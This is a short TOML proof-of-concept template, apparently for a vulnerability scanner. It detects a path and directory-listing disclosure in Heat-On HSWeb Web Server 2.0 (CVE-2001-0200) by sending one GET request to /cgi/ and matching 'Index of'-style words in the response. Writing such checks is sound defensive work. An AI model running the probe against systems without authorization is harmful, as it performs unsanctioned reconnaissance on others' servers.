[info]
author = "ave"
description = "验证目标 Heat-On HSWeb Web Server 2.0 是否存在路径信息泄露漏洞。当服务器 /cgi/ 目录启用目录浏览功能时，远程攻击者发送普通 HTTP 请求即可获取服务器物理路径及目录列表。"
id = "POC-AVE-2001-0078"
name = "Heat-On HSWeb Web Server 2.0 Path Disclosure PoC"
severity = "medium"
tags = ["ave-2001-0078"]
vuln_id = [
    "CVE-2001-0200",
    "AVE-2001-0078",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "cgi-bin",
    "Directory",
    "Index of",
    "Parent Directory",
]
